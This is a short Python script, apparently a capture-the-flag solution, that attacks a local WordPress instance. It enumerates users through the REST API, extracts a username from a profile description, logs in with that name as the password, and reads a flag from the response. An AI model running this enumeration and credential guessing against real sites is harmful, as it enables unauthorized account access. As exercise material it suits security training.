import requests
from re import search
from requests import Session

# run pip install requests

base_url = "http://localhost:8080"

response = requests.get(f"{base_url}/wp-json/wp/v2/users")
json_data = response.json()
description = json_data[0]["description"]
print("Description:", description)
# we extract the username from
# 'Note to authors. Write articles in the name of annabellewallis in the future!'
username = search(r"(?<=name of )\w+", description).group(0)
print("Username:", username)

session = Session()

session.get(f"{base_url}/wp-login.php")

# login attempt with these credentials
response = session.post(
    f"{base_url}/wp-login.php",
    data={
        "log": username,
        "pwd": username,
        "wp-submit": "Log In",
        "redirect_to": f"{base_url}/wp-admin/",
        "testcookie": "1",
    },
)
print("Response:", response.status_code)
try:
    flag = (
        search(r'<div id="login_error">([^<]+)<br />', response.text).group(1).strip()
    )
except AttributeError:
    raise Exception("Could not find flag! Got: " + response.text)
print("Flag:", flag)
